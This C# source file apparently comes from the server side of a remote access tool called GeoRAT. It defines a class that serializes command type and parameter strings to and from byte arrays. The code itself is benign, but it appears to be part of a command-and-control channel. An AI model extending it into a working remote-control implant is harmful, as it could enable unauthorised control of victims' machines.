

using System.IO;


namespace GeoRAT.Server.CommandHandlers
{
    //This class implements ICommandSerializer interface and simply serializes commands object into byte[] array and vice-versa 
    class CommandSerializer : ICommandSerializer
    {


     public byte[] Serialize(Commands cmd)
        {
            MemoryStream stream = new MemoryStream();
            BinaryWriter writer = new BinaryWriter(stream);
            writer.Write(cmd.CommandType);
            writer.Write(cmd.CommandParams);
            return stream.ToArray();
        }

       public Commands Deserialize(byte[] cmdbuf)
        {
            Commands command = new Commands();
            MemoryStream stream = new MemoryStream(cmdbuf);
            BinaryReader read = new BinaryReader(stream);
            command.CommandType = read.ReadString();
            command.CommandParams = read.ReadString();
            return command;
        }
    }
}
